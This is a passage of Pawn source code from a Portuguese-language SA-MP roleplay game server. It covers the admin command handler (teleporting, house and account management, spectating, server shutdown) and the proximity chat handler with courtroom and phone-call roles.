	        SetPlayerHealth(playerid, pHealth[playerid]);
	        AdminData[playerid][admPower] = !AdminData[playerid][admPower];

	        if(!AdminData[playerid][admPower])
	        {
			    DrawTextForPlayer(playerid, "ADMIN POWER MODE [ OFF ]", COLOUR_RED, TEXTDRAW_STYLE_2, 1000);
			}
			
			else
			{
			    SetPlayerHealth(playerid, 999999999999999.0);
			    DrawTextForPlayer(playerid, "ADMIN POWER MODE [ ON ]", COLOUR_GREEN, TEXTDRAW_STYLE_2, 1000);
			}
			
			return 1;
	    }
	    
	    else if(strcmp(adm_cmd, "spawnar", true) == 0)
	    {
	        new plid;
	        
	        adm_tmp = strtok(cmdtext, idx);

			if(!strlen(adm_tmp))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin spawnar [id]");
	            return 1;
			}
			
			plid = strval(adm_tmp);
			
			if(!IsPlayerConnected(plid))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
	            return 1;
	        }
	        
	        UpdatePlayerSpawn(plid);
	        SpawnPlayer(plid);
	    }
	    
	    else if(strcmp(adm_cmd, "vspawnar", true) == 0)
	    {
	        if(IsPlayerInAnyVehicle(playerid))
	            SetVehicleToRespawn(GetPlayerVehicleID(playerid));

	        else
	        {
	            new vid;
	            new Float:X, Float:Y, Float:Z, Float:VX, Float:VY, Float:VZ, Float:dis = 5.0, Float:vdis;
	            
	            vid = -1;
	            GetPlayerPos(playerid, X, Y, Z);
	            
	            for(new v = 0; v < GetVehicles(); v++)
	            {
	                GetVehiclePos(v, VX, VY, VZ);
	                vdis = GetDistance(X, Y, Z, VX, VY, VZ);
	                
	                if(vdis < dis)
	                {
	                    dis = vdis;
	                    vid = v;
	                }
	            }
	            
	            if(vid == -1)
	            {
	                SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar próximo ou dentro de um veículo.");
	                return 1;
				}
				
				SetVehicleToRespawn(vid);
	        }
	    }
	    
	    else if(strcmp(adm_cmd, "goto", true) == 0)
	    {
	        new place[128];
	        new int;
			new Float:X, Float:Y, Float:Z, Float:PX, Float:PY, Float:PZ, Float:dis;
	        new bool:found;
	        
	        int = -1;
	        found = false;
	        strmid(place, cmdtext, idx, strlen(cmdtext));
	        
	        if(!strlen(place))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin goto [local]");
	            return 1;
	        }
	        
	        GetPlayerWorldPos(playerid, PX, PY, PZ);
	        
	        for(new i = 0; i < sizeof Ints; i++)
	        {
	            if(strlen(Ints[i][intName]) > 0 && strcmp(Ints[i][intName], place, true) == 0)
	            {
	                int = i;
	                break;
	            }
	        }
	        
	        if(int != -1)
	        {
	            new Float:edis;
	            
	            for(new e = 0; e < sizeof Enters; e++)
	            {
	                if(Enters[e][intId] == int && Enters[e][enterInt] == 0)
	                {
						if(found)
						{
						    edis = GetDistance(Enters[e][enterX], Enters[e][enterY], Enters[e][enterZ], PX, PY, PZ);
						    
						    if(edis < dis)
						        dis = edis;
						        
							else
							    continue;
						}
						else
						    dis = GetDistance(Enters[e][enterX], Enters[e][enterY], Enters[e][enterZ], PX, PY, PZ);
						
						X = Enters[e][enterX];
		    			Y = Enters[e][enterY];
					    Z = Enters[e][enterZ];
					    
					    found = true;
	                }
	            }
	        }
	        
	        if(!found)
	        {
	            new Float:adis;
	            
	        	for(new a = 0; a < sizeof Areas; a++)
	        	{
	                if(strcmp(Areas[a][areaName], place, true) == 0)
	        	    {
						if(found)
						{
						    adis = GetDistance(Areas[a][areaX], Areas[a][areaY], Areas[a][areaZ], PX, PY, PZ);
						    
						    if(adis < dis)
						        dis = adis;
						        
							else
							    continue;
						}
						
						else
							dis = GetDistance(Areas[a][areaX], Areas[a][areaY], Areas[a][areaZ], PX, PY, PZ);

						X = Areas[a][areaX];
						Y = Areas[a][areaY];
						Z = Areas[a][areaZ];
						
						found = true;
	        	    }
	        	}
			}
			
			if(!found)
	        {
	        	for(new c = 1; c < sizeof Companies; c++)
	        	{
	        	    if(strcmp(Companies[c][cType], place, true) == 0)
	        	    {
	        	        X = Companies[c][cX];
	        	        Y = Companies[c][cY];
	        	        Z = Companies[c][cZ];

	        	        found = true;
	        	        break;
	        	    }
	        	}
			}
			
			if(!found)
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Local inválido.");
			    return 1;
			}
			
			SetPlayerInterior(playerid, 0);
			
			if(IsPlayerInAnyVehicle(playerid))
			    SetVehiclePos(GetPlayerVehicleID(playerid), X, Y, Z + 2.0);
			    
			else
				SetPlayerPos(playerid, X, Y, Z);
	    }
	    
        else if(strcmp(adm_cmd, "anunciar", true) == 0)
	    {
	        new text[128];
	        
			strmid(text, cmdtext, idx, strlen(cmdtext));
			
			if(!strlen(text))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin anunciar [texto]");
	            return 1;
			}

			DrawTextForAll(text, COLOUR_WHITE, TEXTDRAW_STYLE_1, 5000);
	    }
	    
        else if(strcmp(adm_cmd, "casa", true) == 0)
	    {
	        new value, int;
			new Float:X, Float:Y, Float:Z, Float:A;

	        if(IsPlayerInAnyVehicle(playerid))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "Você deve sair do veiculo para utilizar este comando.");
	            return 1;
	        }

	        value = strval(strtok(cmdtext, idx));
	        int = -1;

	        for(new house = 0; house < sizeof HouseInteriors; house++)
	        {
				if(HouseInteriors[house][hintValue] == value)
				{
				    int = house;
				    break;
				}
	        }

	        if(int == -1)
	        {
	        	SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin casa [valor] - VALORES DISPONÍVEIS:");
				SendClientMessage(playerid, COLOUR_GRAY, "10000, 15000, 20000, 25000, 30000, 35000, 40000, 45000, 50000, 55000, 60000, 65000, 70000,");
				SendClientMessage(playerid, COLOUR_GRAY, "75000, 80000, 85000, 90000, 95000, 100000, 120000, 140000, 160000, 175000, 180000, 190000,");
				SendClientMessage(playerid, COLOUR_GRAY, "200000, 225000, 250000, 300000, 500000");
				return 1;
			}

	        GetPlayerPos(playerid, X, Y, Z);
	        GetPlayerFacingAngle(playerid, A);
	        CreateHouse(PlayerName(playerid), value, X, Y, Z, A, 2);
	    }
	    
	    else if(strcmp(adm_cmd, "vercasa", true) == 0)
	    {
	        new value, int;
	        
	        value = strval(strtok(cmdtext, idx));
	        int = -1;
	        
	        for(new house = 0; house < sizeof HouseInteriors; house++)
	        {
	            if(HouseInteriors[house][hintValue] == value)
	            {
	                int = house;
	                break;
	            }
	        }
	
	        if(int == -1)
	        {
	        	SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin vercasa [valor] - VALORES DISPONÍVEIS:");
				SendClientMessage(playerid, COLOUR_GRAY, "10000, 15000, 20000, 25000, 30000, 35000, 40000, 45000, 50000, 55000, 60000, 65000, 70000,");
				SendClientMessage(playerid, COLOUR_GRAY, "75000, 80000, 85000, 90000, 95000, 100000, 120000, 140000, 160000, 175000, 180000, 190000,");
				SendClientMessage(playerid, COLOUR_GRAY, "200000, 225000, 250000, 300000, 500000");
				return 1;
			}

			SetPlayerInterior(playerid, HouseInteriors[int][hintInt]);
			SetPlayerPos(playerid, HouseInteriors[int][hintX], HouseInteriors[int][hintY], HouseInteriors[int][hintZ]);
	    }
	    
	    else if(strcmp(adm_cmd, "valorizarcasa", true) == 0)
	    {
	        new houseid, value, int;

			houseid = House[playerid];

			if(houseid == -1)
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Você não está em uma casa.");
			    return 1;
			}

            value = strval(strtok(cmdtext, idx));
	        int = -1;

	        for(new house = 0; house < sizeof HouseInteriors; house++)
	        {
				if(HouseInteriors[house][hintValue] == value)
				{
				    int = house;
				    break;
				}
	        }

	        if(int == -1)
	        {
	        	SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin valorizarcasa [valor] - VALORES DISPONÍVEIS:");
				SendClientMessage(playerid, COLOUR_GRAY, "10000, 15000, 20000, 25000, 30000, 35000, 40000, 45000, 50000, 55000, 60000, 65000, 70000,");
				SendClientMessage(playerid, COLOUR_GRAY, "75000, 80000, 85000, 90000, 95000, 100000, 120000, 140000, 160000, 175000, 180000, 190000,");
				SendClientMessage(playerid, COLOUR_GRAY, "200000, 225000, 250000, 300000, 500000");
				return 1;
			}
			
			hSetInt(GetHouseFilePath(houseid), "Value", value);
	    }
	    
	    else if(strcmp(adm_cmd, "apagarcasa", true) == 0)
	    {
			new houseid;
			
			houseid = House[playerid];
			
			if(houseid == -1)
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Você não está em uma casa.");
			    return 1;
			}
			
			DeleteHouse(houseid);
	    }
	    
	    else if(strcmp(adm_cmd, "mudarconta", true) == 0)
	    {
	        new File:acc;
			new oldacc[128], newacc[128], xoacc[128], xnacc[128], koacc[128], knacc[128], moacc[128], mnacc[128], path[128];
			new id, value;
			
			oldacc = strtok(cmdtext, idx);
			
			if(!strlen(oldacc))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin mudarconta [conta] [nova conta]");
			    return 1;
			}
			
			if(!IsValidPlayerName(oldacc))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Conta inválida.");
			    return 1;
			}
			
			newacc = strtok(cmdtext, idx);

			if(!strlen(newacc))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin mudarconta [conta] [nova conta]");
			    return 1;
			}

			if(!IsValidPlayerName(newacc))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Nova conta inválida.");
			    return 1;
			}
			
			xoacc = GetPlayerNameXFilePath(oldacc);
			xnacc = GetPlayerNameXFilePath(newacc);
			koacc = GetPlayerNameKFilePath(oldacc);
			knacc = GetPlayerNameKFilePath(newacc);
			moacc = GetPlayerNameMFilePath(oldacc);
			mnacc = GetPlayerNameMFilePath(newacc);
			
			if(!fexist(xoacc) || !fexist(koacc))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Conta inexistente.");
			    return 1;
			}

			if(!CheckBan(oldacc, "\0"))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Essa conta está banida, é necessário o desbanimento para mudá-la.");
			    return 1;
			}
			
			if(fexist(xnacc) && fexist(knacc))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Nova conta já existe.");
			    return 1;
			}

	        acc = fopen(ACCOUNTS_FILE_PATH, io_append);
	        fwrite(acc, newacc);
	        fwrite(acc, "\r\n");
	        fclose(acc);
	        
			fcopytextfile(xoacc, xnacc);
			fcopytextfile(koacc, knacc);
			fcopytextfile(moacc, mnacc);
			fremove(xoacc);
			fremove(koacc);
			fremove(moacc);
			
			value = hGetInt(GANGS_FILE_PATH, oldacc);
			hUnset(GANGS_FILE_PATH, oldacc);
			
			if(value != 0)
				hSetInt(GANGS_FILE_PATH, newacc, value);
				
            value = hGetInt(COMPANIES_FILE_PATH, oldacc);
			hUnset(COMPANIES_FILE_PATH, oldacc);

			if(value != 0)
				hSetInt(COMPANIES_FILE_PATH, newacc, value);
				
            value = hGetInt(PHONES_FILE_PATH, oldacc);
			hUnset(PHONES_FILE_PATH, oldacc);

			if(value != 0)
				hSetInt(PHONES_FILE_PATH, newacc, value);
				
            value = hGetInt(BETS_FILE_PATH, oldacc);
			hUnset(BETS_FILE_PATH, oldacc);

			if(value != 0)
				hSetInt(BETS_FILE_PATH, newacc, value);
			
			for(new v = MaxServerVeh; v < GetVehicles(); v++)
			{
			    path = GetVehicleFilePath(v);
			    
			    if(strlen(path) > 0 && strcmp(hGetString(path, "Owner"), oldacc, true) == 0)
					hSetString(path, "Owner", newacc);
			}
			
			for(new h = 0; h < GetHouses(); h++)
			{
			    path = GetHouseFilePath(h);
			    
			    if(strlen(path) > 0 && strcmp(hGetString(path, "Owner"), oldacc, true) == 0)
					hSetString(path, "Owner", newacc);
			}
			
			id = GetPlayerId(oldacc);
			
			if(id != INVALID_PLAYER_ID)
			    SetPlayerName(id, newacc);
		}

		else if(strcmp(adm_cmd, "apagarconta", true) == 0)
	    {
			new acc[128];
			
	        acc = strtok(cmdtext, idx);

			if(!strlen(acc))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin apagarconta [conta]");
			    return 1;
			}

			if(!IsValidPlayerName(acc))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Conta inválida.");
			    return 1;
			}
			
			DeleteAccount(acc);
		}
		
		else if(strcmp(adm_cmd, "varrercontas", true) == 0)
	    {
	        new File:fwacc, File:fracc;
	        new tmp[128];

			fracc = fopen(ACCOUNTS_FILE_PATH, io_read);
			fwacc = fopen(ACCOUNTS_BUFFER_FILE_PATH, io_write);
			
			while(fread(fracc, tmp, sizeof tmp))
			{
			    new xpath[128], kpath[128], mpath[128];
			    
			    StripNewLine(tmp);
			    
			    if(GetPlayerId(tmp) != INVALID_PLAYER_ID)
			        continue;
			        
			    xpath = GetPlayerNameXFilePath(tmp);
			    kpath = GetPlayerNameKFilePath(tmp);
			    mpath = GetPlayerNameMFilePath(tmp);
			    
				if(fexist(xpath) && fexist(kpath))
				{
				    new level;
				    new bool:delete;
				    
				    level = hGetInt(xpath, "Level");
				    delete = false;
				    
				    if(level <= 0)
				    {
				        new cur_day, cur_month, cur_year, day, month, year, date;
				        
				        new month_days[] = {
			    			31, 28, 31, 30, 31, 30,
							31, 31, 30, 31, 30, 31
				    	};
						    
				    	getdate(cur_year, cur_month, cur_day);
				    	date = hGetInt(kpath, "Last");
						day = date & 0xFF;
						month = (date >> 8) & 0xFF;
						year = (date >> 16) & 0xFFFF;
						
						if(cur_year == year && cur_month == month && cur_day - day > 7)
      						delete = true;

						else if(cur_year == year && cur_month != month && (cur_month - month > 1 || (cur_day + month_days[month]) - day > 7))
							delete = true;
				        
				        else if(cur_year - year > 1 || (cur_month + 12) - month > 1 || (cur_day + month_days[month]) - day > 7)
				        	delete = true;
				    }
				    
				    if(delete)
				        DeleteAccount(tmp);
				        
				    else
				    	fwrite(fwacc, tmp);
				}
				
				else
				{
				    if(fexist(xpath))
				        fremove(xpath);
				        
					if(fexist(kpath))
					    fremove(kpath);
					    
					if(fexist(mpath))
					    fremove(mpath);
				}
			}
			
			fclose(fracc);
			fclose(fwacc);

			if(fcopytextfile(ACCOUNTS_BUFFER_FILE_PATH, ACCOUNTS_FILE_PATH))
				fremove(ACCOUNTS_BUFFER_FILE_PATH);
	    }
		
		else if(strcmp(adm_cmd, "resetarvenda", true) == 0)
		{
		    new string[128];
	        new vehid, model, model_type, colour1, colour2;

			for(new vfs = 0; vfs < sizeof VehiclesForSale; vfs++)
			{
				vehid = VehiclesForSale[vfs][osVehId];
				model_type = VehiclesForSale[vfs][osModelType];

				if(model_type == MODEL_TYPE_CAR)
				    model = RandomCarModel();

				if(model_type == MODEL_TYPE_BIKE)
				    model = RandomBikeModel();

				if(model_type == MODEL_TYPE_AIR)
				    model = RandomAirModel();

				if(model_type == MODEL_TYPE_BOAT)
				    model = RandomBoatModel();

				if(vehid != -1)
				{
		        	DestroyVehicle(vehid);
		        	Delete3DTextLabel(VehiclesForSale[vfs][osText]);
				}
				
				colour1 = random(300);
				colour2 = random(300);
				format(string, sizeof string, "Modelo: %s\nValor: $%d,00 dólares", Vehicles[model - 400][vehModel], Vehicles[model - 400][vehValue]);
				VehiclesForSale[vfs][osText] = Create3DTextLabel(string, COLOUR_GREEN, 0.0, 0.0, 0.0, 30.0, 0);
				VehiclesForSale[vfs][osColours] = ((colour1 & 0xFFFF) << 16) | (colour2 & 0xFFFF);
				VehiclesForSale[vfs][osVehId] = CreateVehicle(model, VehiclesForSale[vfs][osX], VehiclesForSale[vfs][osY], VehiclesForSale[vfs][osZ], VehiclesForSale[vfs][osA], colour1, colour2, -1);
                Attach3DTextLabelToVehicle(VehiclesForSale[vfs][osText], VehiclesForSale[vfs][osVehId], 0.0, 0.0, 1.5);
			}
		}
		
		else if(strcmp(adm_cmd, "spec", true) == 0)
		{
		    new tmp[128];
		    new specid;
		    
			tmp = strtok(cmdtext, idx);
			
			if(!strlen(tmp))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin spec [id/off]");
			    return 1;
			}
			
			if(strcmp(tmp, "off", true) == 0)
			{
	    		AdminData[playerid][admSpec] = INVALID_PLAYER_ID;
	    		TogglePlayerSpectating(playerid, false);
	    		SetPlayerInterior(playerid, AdminData[playerid][admInt]);
	    		SetPlayerPos(playerid, AdminData[playerid][admX], AdminData[playerid][admY], AdminData[playerid][admZ]);
   				SetPlayerFacingAngle(playerid, AdminData[playerid][admA]);
			    return 1;
			}
			
			specid = strval(tmp);
			
			if(AdminData[playerid][admSpec] == INVALID_PLAYER_ID)
			{
		    	GetPlayerPos(playerid, AdminData[playerid][admX], AdminData[playerid][admY], AdminData[playerid][admZ]);
		    	GetPlayerFacingAngle(playerid, AdminData[playerid][admA]);
		    	AdminData[playerid][admInt] = GetPlayerInterior(playerid);
			}
			
			AdminData[playerid][admSpec] = specid;
		    SetPlayerInterior(playerid, GetPlayerInterior(specid));
		    TogglePlayerSpectating(playerid, true);
		    
		    if(!IsPlayerInAnyVehicle(specid))
		        PlayerSpectatePlayer(playerid, specid);
		        
			else
			    PlayerSpectateVehicle(playerid, GetPlayerVehicleID(specid));
			    
		    return 1;
		}
		
		else if(strcmp(adm_cmd, "focalizarcamera", true) == 0)
		{
		    new tmp[128];
		    new plid;

			tmp = strtok(cmdtext, idx);

			if(!strlen(tmp))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin focalizarcamera [id]");
			    return 1;
			}
			
			plid = strval(tmp);

			if(!IsPlayerConnected(plid))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
			    return 1;
			}
			
			SetCameraBehindPlayer(plid);
		}
		
		else if(strcmp(adm_cmd, "alcool", true) == 0)
		{
		    new tmp[128];
		    new plid, drunk;

			tmp = strtok(cmdtext, idx);

			if(!strlen(tmp))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin alcool [id] [quantidade]");
			    return 1;
			}

			plid = strval(tmp);

			if(!IsPlayerConnected(plid))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
			    return 1;
			}

            tmp = strtok(cmdtext, idx);

			if(!strlen(tmp))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin alcool [id] [quantidade]");
			    return 1;
			}

			drunk = strval(tmp);
			
			if(drunk < 0)
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Quantidade inválida!");
			    return 1;
			}
			
			SetPlayerDrunkLevel(plid, drunk);
		}
		
		else if(strcmp(adm_cmd, "pararsom", true) == 0)
		{
		    new tmp[128];
		    new plid;

			tmp = strtok(cmdtext, idx);

			if(!strlen(tmp))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin pararsom [id]");
			    return 1;
			}

			plid = strval(tmp);

			if(!IsPlayerConnected(plid))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
			    return 1;
			}

			StopAudioStreamForPlayer(plid);
		}
		
		else if(strcmp(adm_cmd, "voar", true) == 0)
		{
		    AdminData[playerid][admFly] = !AdminData[playerid][admFly];
		    
	    	if(AdminData[playerid][admFly])
	    	{
	    	    KeyEvent[playerid] |= KEY_EVENT_FLYING;
	    	    TogglePlayerControllable(playerid, false);
				AdminData[playerid][admFly] = random(3) + 1;
	    	    
				switch(AdminData[playerid][admFly])
				{
				    case 1: ApplyAnimation(playerid, "PARACHUTE", "FALL_SkyDive_Accel", 4.1, 0, 1, 1, 1, 150, 1);
				    case 2: ApplyAnimation(playerid, "PARACHUTE", "PARA_steerL", 4.1, 0, 1, 1, 1, 150, 1);
				    case 3: ApplyAnimation(playerid, "PARACHUTE", "PARA_steerR", 4.1, 0, 1, 1, 1, 150, 1);
				}
		    }

		    else
		    {
		        KeyEvent[playerid] &= ~KEY_EVENT_FLYING;
		        TogglePlayerControllable(playerid, true);
	    	    ClearAnimations(playerid);
	        	SetCameraBehindPlayer(playerid);
	    	}
		}
		
		else if(strcmp(adm_cmd, "tapa", true) == 0)
		{
		    new tmp[128];
		    new plid;
		    new Float:X, Float:Y, Float:Z, Float:A, Float:D;

			tmp = strtok(cmdtext, idx);

			if(!strlen(tmp))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin tapa [id]");
			    return 1;
			}
			
			plid = strval(tmp);
			
			if(!IsPlayerConnected(plid))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
			    return 1;
			}
			
			GetPlayerPos(plid, X, Y, Z);
			A = float(random(360));
			D = float(random(3)) + 0.5;
			X += D * floatsin(-A, degrees);
			Y += D * floatcos(-A, degrees);
			Z += 10.0;
			SetPlayerPos(plid, X, Y, Z);
		}
		
		else if(strcmp(adm_cmd, "checar", true) == 0)
		{
		    new tmp[128], string[128], xpath[128];
		    new plid;
			new Float:H, Float:A;
			
			tmp = strtok(cmdtext, idx);

			if(!strlen(tmp))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin checar [id]");
			    return 1;
			}

			plid = strval(tmp);

			if(!IsPlayerConnected(plid))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
			    return 1;
			}
			
			xpath = GetPlayerXFilePath(plid);
			GetPlayerSysHealth(plid, H);
			GetPlayerArmour(plid, A);
			
			format(string, sizeof string, "[-----] Dados de %s (ID: %d) [-----]", PlayerName(plid), plid);
			SendClientMessage(playerid, COLOUR_RED, string);
			format(string, sizeof string, "Level: %d <> XL: %d <> Dinheiro: $%d,00 dólares <> Banco: $%d,00 dólares", hGetInt(xpath, "Level"), hGetInt(xpath, "Xpoints"), GetPlayerSysMoney(plid), hGetInt(xpath, "Bank"));
			SendClientMessage(playerid, COLOUR_WHITE, string);
			format(string, sizeof string, "Vida: %.2f <> Colete: %.2f", H, A);
			SendClientMessage(playerid, COLOUR_WHITE, string);
			format(string, sizeof string, "Arma atual: %d/%d <> Arma pesada: %d/%d <> Arma leve: %d/%d <> Arma branca: %d", GetPlayerWeapon(plid), GetPlayerAmmo(plid), pWeapons[plid][0], pWeapons[plid][1], pWeapons[plid][2], pWeapons[plid][3], pWeapons[plid][4]);
			SendClientMessage(playerid, COLOUR_WHITE, string);
			return 1;
		}
		
		else if(strcmp(adm_cmd, "server", true) == 0)
		{
		    new string[128], host[128], url[128], mapname[128];

			GetServerVarAsString("hostname", host, sizeof host);
			GetServerVarAsString("weburl", url, sizeof url);
			GetServerVarAsString("mapname", mapname, sizeof mapname);
			
		    SendClientMessage(playerid, COLOUR_GREEN, "[-----] Dados do Servidor [-----]");
		    format(string, sizeof string, "Host: %s", host);
			SendClientMessage(playerid, COLOUR_WHITE, string);
		    format(string, sizeof string, "Tempo de Atualização: %dms <> Veículos: %d <> Casas: %d", UpdateTime, GetVehicles(), GetHouses());
		    SendClientMessage(playerid, COLOUR_WHITE, string);
			format(string, sizeof string, "Dia: %s (%d) <> Tempo: %s (%d)", Days[CurrentDay], CurrentDay, ToTime(CurrentHour, CurrentMinute, -1), CurrentTime);
			SendClientMessage(playerid, COLOUR_WHITE, string);
			format(string, sizeof string, "Clima: %s (%d)", Weathers[CurrentWeather][wInfo], CurrentWeather);
			SendClientMessage(playerid, COLOUR_WHITE, string);
			format(string, sizeof string, "Máximo de Jogadores: %d <> Mapa: %s", GetServerVarAsInt("maxplayers"), mapname);
			SendClientMessage(playerid, COLOUR_WHITE, string);
			format(string, sizeof string, "URL: %s", url);
			SendClientMessage(playerid, COLOUR_WHITE, string);
			return 1;
		}
		
		else if(strcmp(adm_cmd, "net", true) == 0)
		{
		    new stats[512], tmp[128], caption[32], name[MAX_PLAYER_NAME];
			new plid, len;
			
			tmp = strtok(cmdtext, idx);
			plid = strval(tmp);
			
			if(strlen(tmp) > 0 && IsPlayerConnected(plid))
			{
			    GetPlayerName(plid, name, sizeof name);
			    len = strlen(name);
			    
			    if(name[len - 1] != 's')
			    	format(caption, sizeof caption, "%s's Network Stats", name);
			    	
				else
				    format(caption, sizeof caption, "%s' Network Stats", name);
				    
			    GetPlayerNetworkStats(plid, stats, sizeof stats);
			}
			
			else
			{
			    format(caption, sizeof caption, "Server's Network Stats");
			    GetNetworkStats(stats, sizeof stats);
			}
			
            ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, caption, stats, "Close", "");
			return 1;
		}
		
		else if(strcmp(adm_cmd, "fechar", true) == 0)
		{
		    SendClientMessageToAll(COLOUR_RED, "[==================] FECHANDO SERVIDOR [==================]");
		    StartGameModeExit(10);
		}
		
	    else
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin [comando] - COMANDOS DISPONÍVEIS:");
			SendClientMessage(playerid, COLOUR_GRAY, "say, pm, admins, moderadores, moderador, report, banir, desbanir, kickar, arma, ir, trazer, empregar,");
			SendClientMessage(playerid, COLOUR_GRAY, "skill, dinheiro, vida, colete, paralisar, desparalisar, level, skin, veiculo, combustivel, cores,");
			SendClientMessage(playerid, COLOUR_GRAY, "power, spawnar, vspawnar, goto, anunciar, casa, vercasa, valorizarcasa, apagarcasa, server,");
			SendClientMessage(playerid, COLOUR_GRAY, "net, mudarconta, apagarconta, varrercontas, resetarvenda, spec, focalizarcamera, alcool,");
			SendClientMessage(playerid, COLOUR_GRAY, "pararsom, voar, tapa, checar, fechar");
			return 1;
	    }

		reportf("Admin Command: %s -> %s", REPORT_DEFAULT, PlayerName(playerid), cmdtext);
	    SendClientMessage(playerid, COLOUR_GREEN, "Feito.");
	    return 1;
	}
	
	SendClientMessage(playerid, COLOUR_WHITE, "Comando inexistente.");
	return 1;
}

public OnPlayerText(playerid, text[])
{
    if(!IsPlayerLogged(playerid))
	{
	    DrawTextForPlayer(playerid, "Você deve efetuar login para fazer isso.", COLOUR_RED, TEXTDRAW_STYLE_3, 2000);
	    return 0;
	}
	
	if(Dying[playerid] != 0)
	{
	    DrawTextForPlayer(playerid, "Você não pode falar enquanto estiver inconsciente.", COLOUR_RED, TEXTDRAW_STYLE_3, 2000);
	    return 0;
	}
	
	new string[128];
	
	if(TribunalJudge != -1)
	{
		if(Audience[0] == playerid || Audience[1] == playerid)
		{
		    new Float:X, Float:Y, Float:Z, Float:PX, Float:PY, Float:PZ;

			format(string, sizeof string, "[AUDIENCIA] %s: %s", PlayerName(playerid), text);
			GetPlayerPos(playerid, X, Y, Z);
			
			for(new n = 0; n < MAX_SLOTS; n++)
			{
			    GetPlayerPos(n, PX, PY, PZ);

			    if(GetDistance(X, Y, Z, PX, PY, PZ) < 50.0)
			        SendClientMessage(n, COLOUR_JUDGE, string);
			}
			
			ApplyAnimation(playerid, "PED", "IDLE_CHAT", 4.1, 0, 1, 1, 1, 1);
 			return 0;
 		}
 		
 		if(Lawyers[0] == playerid || Lawyers[1] == playerid)
 		{
 			new Float:X, Float:Y, Float:Z, Float:PX, Float:PY, Float:PZ;

			format(string, sizeof string, "[ADVOGADO] %s: %s", PlayerName(playerid), text);
			GetPlayerPos(playerid, X, Y, Z);

			for(new n = 0; n < MAX_SLOTS; n++)
			{
			    GetPlayerPos(n, PX, PY, PZ);
			    
			    if(GetDistance(X, Y, Z, PX, PY, PZ) < 50.0)
			        SendClientMessage(n, COLOUR_JUDGE, string);
			}

			ApplyAnimation(playerid, "PED", "IDLE_CHAT", 4.1, 0, 1, 1, 1, 1);
 			return 0;
 		}
 		
 		if(TribunalJudge == playerid)
 		{
 		    new Float:X, Float:Y, Float:Z, Float:PX, Float:PY, Float:PZ;

			format(string, sizeof string, "[JUIZ] %s: %s", PlayerName(playerid), text);
			GetPlayerPos(playerid, X, Y, Z);

			for(new n = 0; n < MAX_SLOTS; n++)
			{
			    GetPlayerPos(n, PX, PY, PZ);

			    if(GetDistance(X, Y, Z, PX, PY, PZ) < 50.0)
			        SendClientMessage(n, COLOUR_JUDGE, string);
			}

			ApplyAnimation(playerid, "PED", "IDLE_CHAT", 4.1, 0, 1, 1, 1, 1);
 			return 0;
 		}
	}
	
	if(Call[playerid] & 0x1)
	{
	    new id;
	    new Float:X, Float:Y, Float:Z, Float:PX, Float:PY, Float:PZ;

	    id = Call[playerid] >> 2;
        GetPlayerPos(playerid, X, Y, Z);
	    format(string, sizeof string, "* [ %s: %s ]", PlayerName(playerid), text);
	    SendClientMessage(playerid, COLOUR_WHITE, string);
	    SendClientMessage(id, COLOUR_WHITE, string);

		for(new n = 0; n < MAX_SLOTS; n++)
		{
		    if(n != playerid && n != id)
		    {
		    	GetPlayerPos(n, PX, PY, PZ);

			    if(GetDistance(X, Y, Z, PX, PY, PZ) < 30.0)
			        SendClientMessage(n, COLOUR_WHITE, string);
			}
		}
	}
	
	else
	{
		new colour;
		new Float:X, Float:Y, Float:Z, Float:PX, Float:PY, Float:PZ;
	
		GetPlayerPos(playerid, X, Y, Z);
		format(string, sizeof string, "* %s: %s", PlayerName(playerid), text);
		colour = GetPlayerColour(playerid);
	
		for(new n = 0; n < MAX_SLOTS; n++)
		{
		    GetPlayerPos(n, PX, PY, PZ);

		    if(GetDistance(X, Y, Z, PX, PY, PZ) < 30.0)
		        SendClientMessage(n, colour, string);
		}
		
		report(string, REPORT_CHAT);
	}
	
	return 0;
}

public KeyHandler()
{
	for(new n = 0; n < MAX_SLOTS; n++)
	{
	    if(IsPlayerConnected(n) && IsPlayerLogged(n) && KeyEvent[n] != KEY_EVENT_NULL && Dying[n] == 0)
	    {
			new key, up_down, left_right;

			GetPlayerKeys(n, key, up_down, left_right);
			
			if(key | up_down | left_right != 0)
				OnPlayerPressedKey(n, key, up_down, left_right);
	    }
	}
}

public Update()
{
	new start;
	
	start = GetTickCount();
	
    if(TuneData[0] != INVALID_PLAYER_ID && TuneData[1] != -1 && TuneData[2] != -1)
	{
